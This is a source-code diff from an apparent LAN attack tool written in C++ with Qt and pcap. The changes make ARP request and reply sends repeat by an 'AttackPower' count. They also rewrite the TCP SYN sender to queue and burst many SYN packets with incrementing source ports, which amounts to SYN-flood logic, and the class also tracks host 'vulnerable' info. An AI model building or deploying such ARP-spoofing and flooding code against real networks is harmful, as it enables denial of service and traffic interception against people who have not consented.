@@ -339,7 +339,7 @@ LANPcap::~LANPcap()
     DevLists=nullptr;
 }
 
-
+//if each packet is the same , use TMP to save code
 template<typename T>
 qint64 SendPacket( struct pcap* PcapHandle,T Packet,int Count)
 {
@@ -374,7 +374,7 @@ bool LANPcap::SendArpRequestPacket(const LANHostInfo &SrcHost, const LANHostInfo
     arp_packet Packet;
     buildArpRequestPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr);
 
-    qint64 SentLen=SendPacket(PcapHandle,Packet,100);
+    qint64 SentLen=SendPacket(PcapHandle,Packet,AttackPower);
     if(SentLen>0)
     {
         this->NetworkSendSize+=SentLen;
@@ -400,7 +400,9 @@ bool LANPcap::SendArpReplyPacket(const LANHostInfo &SrcHost, const LANHostInfo &
     arp_packet Packet;
     buildArpReplyPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr);
 
-    qint64 SentLen=SendPacket(PcapHandle,Packet,100);
+
+
+    qint64 SentLen=SendPacket(PcapHandle,Packet,AttackPower);
     if(SentLen>0)
     {
         this->NetworkSendSize+=SentLen;
@@ -421,50 +423,50 @@ bool LANPcap::SendArpReplyPacket(const LANHostInfo &SrcHost, const LANHostInfo &
 
 bool LANPcap::SendTcpSynPacket(const LANHostInfo &SrcHost,const LANHostInfo &DstHost,unsigned short SrcPort,unsigned short DstPort)
 {
-    tcp_packet Packet;
-    buildSynPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr,SrcPort,DstPort);
+//    tcp_packet Packet;
+//    buildSynPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr,SrcPort,DstPort);
 
-//    if(0!=(pcap_sendpacket(PcapHandle,(const uchar*)(&Packet),sizeof(tcp_packet))))
+
+//    qint64 SentLen=SendPacket(PcapHandle,Packet,10);
+//    if(SentLen>0)
 //    {
-//        qDebug()<<"send tcp syn packet fail"<<pcap_geterr(PcapHandle);
 
-
-//        return false;
+//        this->NetworkSendSize+=SentLen;
+//        return true;
 //    }
-//    return true;
+//    return false;
 
 
-    //TODO, don't use repeat packet, refactory to enqueue targets with ports instead
-    qint64 SentLen=SendPacket(PcapHandle,Packet,10);
+
+    int Count=AttackPower;
+    QTime CurTime=QTime::currentTime();
+    timeval ts;
+    ts.tv_sec=CurTime.second();
+    ts.tv_usec=CurTime.msec();
+
+    pcap_pkthdr PacketHeader={ts,sizeof(tcp_packet),sizeof(tcp_packet)};
+
+    struct pcap_send_queue *PacketQueue=pcap_sendqueue_alloc((sizeof(tcp_packet) + sizeof(pcap_pkthdr) )*Count);
+
+
+    //incre the port to avoid same syn packet
+    for(int i=0;i<Count;++i)
+    {
+         tcp_packet Packet;
+         buildSynPacket(Packet,SrcHost.MacAddr,SrcHost.Ipv4Addr,DstHost.Ipv4Addr,DstHost.MacAddr,(SrcPort+i)%65535,DstPort);
+         pcap_sendqueue_queue(PacketQueue,&PacketHeader,(const uchar*)(&Packet));
+    }
+    int SentLen=pcap_sendqueue_transmit(PcapHandle,PacketQueue,0);
+    pcap_sendqueue_destroy(PacketQueue);
     if(SentLen>0)
     {
-        this->NetworkSendSize+=SentLen;
-        return true;
+
+       this->NetworkSendSize+=SentLen;
+       return true;
     }
+
     return false;
 
-
-//    QTime CurTime=QTime::currentTime();
-
-//    timeval ts;
-//    ts.tv_sec=CurTime.second();
-//    ts.tv_usec=CurTime.msec();
-
-//    pcap_pkthdr PacketHeader={ts,sizeof(tcp_packet),sizeof(tcp_packet)};
-
-//    struct pcap_send_queue *PacketQueue=pcap_sendqueue_alloc(1024*256);
-
-//    for(int i=0;i<100;++i)
-//    {
-//         pcap_sendqueue_queue(PacketQueue,&PacketHeader,(const uchar*)(&Packet));
-//    }
-//    int SentLen=pcap_sendqueue_transmit(PcapHandle,PacketQueue,0);
-
-
-
-//    pcap_sendqueue_destroy(PacketQueue);
-
-//    return true;
 
 }
 
@@ -517,6 +519,7 @@ void LANPcap::SetCurrentNetInterface(int Index)
     {
         this->CurrentSelectDevIndex=Index;
         const DeviceInterfaceInfo &SelectInterface=CacheDevs[CurrentSelectDevIndex];
+
         memcpy(LANFormat,SelectInterface.Ipv4Addr,3);
 
         char ErrBuf[PCAP_ERRBUF_SIZE];
@@ -573,6 +576,8 @@ unsigned char LANPcap::GetCurrentInterfaceLANIndex()
     const DeviceInterfaceInfo &SelectInterface=CacheDevs[CurrentSelectDevIndex];
     return SelectInterface.Ipv4Addr[3];
 }
+
+
 
 void LANPcap::UpdateHostVulerableInfo(int HostIndex)
 {
